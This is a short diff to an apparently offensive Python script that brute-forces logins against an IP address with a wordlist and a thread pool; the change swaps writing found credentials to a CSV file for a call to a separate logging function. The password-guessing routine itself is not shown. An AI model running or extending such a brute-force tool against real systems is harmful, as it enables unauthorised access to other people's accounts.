@@ -1,7 +1,7 @@
 import subprocess
 from concurrent.futures import ThreadPoolExecutor
 import os
-import csv
+from logger import log_result  # <- Import logger function
 
 def try_login(ip, username, password):
     print(f"Trying: {username}:{password}")
@@ -25,10 +25,8 @@ def run_brute_force(ip, wordlist_path, threads):
         for i, f in enumerate(futures):
             if f.result():
                 username, password = combos[i]
-                os.makedirs("results", exist_ok=True)
-                with open("results/found.csv", mode="a", newline="") as file:
-                    writer = csv.writer(file)
-                    writer.writerow([ip, username, password])
+                # Log result using logger.py function
+                log_result(ip, username, password, "Success")
                 print(f"[+] Found Valid Credentials: {username}:{password}")
                 return combos[i]
     return None
